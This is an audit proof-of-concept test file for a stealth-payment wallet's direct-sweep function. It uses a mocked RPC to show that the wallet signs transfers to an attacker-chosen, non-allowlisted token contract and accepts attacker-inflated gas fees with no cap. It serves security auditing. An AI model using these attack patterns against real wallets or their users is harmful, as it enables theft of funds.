// Vitest PoC (run: npx vitest run --root docs/audits/poc poc-07-direct-sweep.test.ts, from the repo root).
// Shows (1) direct sweep signs a tx whose `to` is an attacker-chosen "token" taken from announcement metadata (no allowlist check),
// (2) a single lying RPC controls gas price/fee for a direct native sweep (no cap, no confirmation), (3) directSweep trusts RPC balance.
import { describe, expect, it } from 'vitest';
import { deriveStealthPayment, buildErc20Metadata, buildNativeMetadata } from '@ghostpay/core-crypto';
import { generateSession, requireSession, getSessionPublic } from '../../../apps/web/src/lib/session';
import { directSweep } from '../../../apps/web/src/lib/sweep';
import { deriveStealthSecret } from '@ghostpay/core-crypto';
import { addressOfSecret } from '@ghostpay/chain-adapters';
import { parseTransaction } from 'viem/utils';
import { bytesToHex } from '@noble/hashes/utils.js';

function announce(token: 'native' | string) {
  generateSession();
  const pub = getSessionPublic()!;
  const p = deriveStealthPayment(pub.metaAddress);
  const md = token === 'native' ? buildNativeMetadata(p.viewTag, 10n ** 18n) : buildErc20Metadata(p.viewTag, token, 10n ** 12n);
  const announcement = { schemeId: 1n, stealthAddress: p.stealthAddress, ephemeralPublicKey: '0x' + bytesToHex(p.ephemeralPublicKey), metadata: '0x' + bytesToHex(md) };
  return { announcement, owner: p.stealthAddress as `0x${string}` };
}
const fakeRpc = (o: { gasPrice: bigint; balance: bigint; sent: string[] }) => ({
  request: async (m: string, params: readonly unknown[]) => {
    if (m === 'eth_gasPrice') return '0x' + o.gasPrice.toString(16);
    if (m === 'eth_getTransactionCount') return '0x0';
    if (m === 'eth_getBalance') return '0x' + o.balance.toString(16);
    if (m === 'eth_estimateGas') return '0x30d40'; // 200k, as an RPC (or a gas-guzzling contract) would report
    if (m === 'eth_sendRawTransaction') { o.sent.push(params[0] as string); const { keccak256 } = await import('viem/utils'); return keccak256(params[0] as `0x${string}`); }
    throw new Error('unexpected ' + m);
  },
});

describe('direct sweep trust issues', () => {
  it('signs a transaction to an attacker-chosen, non-allowlisted "token" contract', async () => {
    const attackerToken = '0x00000000000000000000000000000000DeaDBeef';
    const { announcement, owner } = announce(attackerToken);
    const o = { gasPrice: 10n ** 9n, balance: 10n ** 17n, sent: [] as string[] };
    const res = await directSweep({ target: { chainId: 84532, token: attackerToken as `0x${string}`, owner, announcement }, destination: '0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65', amount: 10n ** 12n, rpc: fakeRpc(o) });
    const tx = parseTransaction(o.sent[0] as `0x${string}`);
    console.log('[PoC] signed tx.to =', tx.to, '(NOT on the allowlist; Sweep.tsx claims such tokens "will not be swept from here")', 'gas =', tx.gas);
    expect(tx.to?.toLowerCase()).toBe(attackerToken.toLowerCase());
    expect(res.hash).toMatch(/^0x/);
  });

  it('a lying RPC controls fee parameters of a native direct sweep (loss bounded to ~5 % tip, but uncapped and unconfirmed)', async () => {
    const { announcement, owner } = announce('native');
    const balance = 10n ** 18n; // 1 ETH of "payment"
    // gasPrice such that 21000 * 2 * gasPrice = 90 % of the balance
    const gasPrice = (balance * 90n) / 100n / (21_000n * 2n);
    const o = { gasPrice, balance, sent: [] as string[] };
    const res = await directSweep({ target: { chainId: 84532, token: 'native', owner, announcement }, destination: '0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65', amount: balance, rpc: fakeRpc(o) });
    const tx = parseTransaction(o.sent[0] as `0x${string}`);
    const maxFeeCost = (tx.gas as bigint) * (tx.maxFeePerGas as bigint);
    const tipCost = (tx.gas as bigint) * (tx.maxPriorityFeePerGas as bigint); // what a colluding block producer actually receives
    console.log(`[PoC] maxFeePerGas=${Number(tx.maxFeePerGas) / 1e9} gwei, maxPriorityFeePerGas=${Number(tx.maxPriorityFeePerGas) / 1e9} gwei: signed max fee = ${Number((maxFeeCost * 100n) / balance)} % of balance, tip to proposer = ${Number((tipCost * 1000n) / balance) / 10} % of balance; no cap, no sanity check, no confirmation dialog`);
    expect(maxFeeCost * 100n / balance).toBeGreaterThanOrEqual(89n);
    expect(tipCost * 100n / balance).toBeGreaterThanOrEqual(4n);
    expect(res.sent).toBeLessThan(balance);
  });
});
